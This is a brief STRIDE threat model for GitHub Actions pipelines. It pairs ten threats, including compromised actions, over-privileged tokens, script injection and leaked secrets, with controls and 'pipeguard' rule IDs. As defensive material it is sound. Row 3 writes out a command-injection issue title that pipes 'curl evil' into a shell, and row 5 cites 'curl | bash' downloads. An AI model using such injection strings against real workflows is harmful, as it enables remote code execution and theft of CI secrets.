# CI/CD threat model (summary)

Scope: GitHub Actions workflows that build, test and publish code. Assets: the repository, the
`GITHUB_TOKEN`, repository and environment secrets, build artifacts and release tags.

| # | Threat (STRIDE) | Example | Control | pipeguard rule |
|---|---|---|---|---|
| 1 | Tampering: compromised third-party action | Action tag repointed to secret-stealing code | SHA pinning + Dependabot | PG003, PG004 |
| 2 | Elevation: over-privileged token | Default token with write access used by a test job | `permissions: contents: read`, per-job grants | PG001, PG002 |
| 3 | Tampering: script injection | Issue title `"; curl evil \| sh #` interpolated into `run:` | Pass via `env:`, quote the variable | PG005 |
| 4 | Elevation: privileged trigger runs fork code | `pull_request_target` checks out the PR head with secrets available | Use `pull_request`; never check out PR head in privileged triggers | PG006 |
| 5 | Tampering: unverified download | `curl … \| bash` from a vendor site | Download, verify checksum or signature, then run | PG007 |
| 6 | Information disclosure: secret in logs | `echo ${{ secrets.TOKEN }}` while debugging | Pass secrets via `env:` only to the tool that needs them | PG008 |
| 7 | Information disclosure: token left on disk | Checkout persists the token in `.git/config` for later steps | `persist-credentials: false` | PG009 |
| 8 | Elevation: persistent runner compromise | Fork PR runs on a long-lived self-hosted runner | Ephemeral GitHub-hosted runners for untrusted code | PG010 |
| 9 | Tampering: vulnerable dependency added | PR adds a package with a known critical CVE | Dependency review on pull requests | (workflow) |
| 10 | Repudiation / tampering: history rewrite | Force-push removes a reviewed commit from `main` | Branch ruleset: block force pushes and deletion | (repository setting) |

Residual risks: compromised maintainer accounts (mitigate with 2FA and required reviews), malicious
code inside a pinned action version (mitigate by reviewing Dependabot diffs), and anything that
static analysis of workflow files cannot see, such as scripts the workflow calls.
